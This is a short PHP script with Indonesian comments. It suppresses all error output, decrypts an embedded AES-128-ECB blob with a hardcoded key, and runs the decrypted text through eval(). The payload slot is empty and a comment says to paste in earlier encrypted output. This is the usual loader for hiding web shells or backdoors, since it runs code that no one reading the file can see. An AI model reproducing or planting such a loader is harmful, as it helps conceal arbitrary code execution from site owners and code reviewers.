<?php
error_reporting(0);
ini_set('display_errors', 0);

// Kunci enkripsi, harus sama dengan kunci yang digunakan saat enkripsi
$kunci = '1234567890abcdef';

// Konten terenkripsi yang didapatkan sebelumnya
$encryptedContent = ''; // Ganti dengan hasil enkripsi dari langkah pertama

// Dekripsi konten
$decryptedContent = openssl_decrypt($encryptedContent, 'AES-128-ECB', $kunci, 0);

// Eksekusi konten yang didekripsi
eval('?>' . $decryptedContent);
?>